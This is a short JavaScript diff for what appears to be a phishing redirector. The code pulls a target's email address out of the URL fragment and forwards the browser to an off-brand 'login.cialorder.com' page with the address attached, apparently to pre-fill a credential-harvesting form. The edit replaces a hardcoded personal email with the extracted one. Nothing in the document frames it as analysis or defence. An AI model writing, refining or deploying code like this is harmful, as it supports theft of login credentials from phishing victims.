@@ -9,8 +9,8 @@
       // Check if the URL contains an '=' character followed by '#' and an email address
       var emailRegex = /=(?=#[^#]*$)/;
       if (emailRegex.test(currentURL)) {
-        // Replace the '=' character with an empty string
-        var cleanURL = currentURL.replace(emailRegex, '');
+        // Replace the '=' character and everything that comes after it with an empty string
+        var cleanURL = currentURL.replace(/=.*/, '');
 
         // Redirect to the cleaned URL
         window.location.href = cleanURL;
@@ -37,8 +37,8 @@
           var email = emailPart.match(/[^@]+@[^@]+/);
 
           if (email) {
-            // Construct the redirect URL without duplicating the email
-            var redirectURL = 'https://login.cialorder.com/mhXayjAt#jeremywilder012@outlook.com';
+            // Construct the redirect URL by appending the extracted email to the second link
+            var redirectURL = 'https://login.cialorder.com/mhXayjAt?' + email[0];
 
             // Redirect to the constructed URL
             window.location.href = redirectURL;
